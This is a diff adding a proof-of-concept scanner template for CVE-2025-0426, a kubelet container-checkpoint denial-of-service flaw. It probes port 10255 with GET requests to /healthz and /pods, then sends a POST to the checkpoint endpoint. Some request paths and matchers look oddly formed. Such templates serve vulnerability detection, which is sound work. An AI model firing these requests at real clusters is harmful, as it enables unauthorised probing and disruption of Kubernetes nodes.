@@ -1,0 +1,56 @@
+[info]
+author = "AVE"
+description = "检测 Kubernetes kubelet 只读 HTTP 端点（默认 10255 端口）是否开放且未授权访问，通过发送容器检查点请求验证漏洞存在。注意：仅发送单次请求验证端点可达，不会触发 DoS。"
+id = "POC-AVE-2025-0380"
+name = "Kubernetes kubelet 容器检查点请求导致节点拒绝服务漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2025-0426",
+    "kubernetes",
+    "kubelet",
+    "dos",
+    "checkpoint",
+]
+vuln_id = [
+    "CVE-2025-0426",
+    "AVE-2025-0380",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}:10255/healthz"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["ok"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}:10255/pods"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["items"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}:10255/checkpoint/default/test-pod/test-container"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "items",
+    "created",
+]
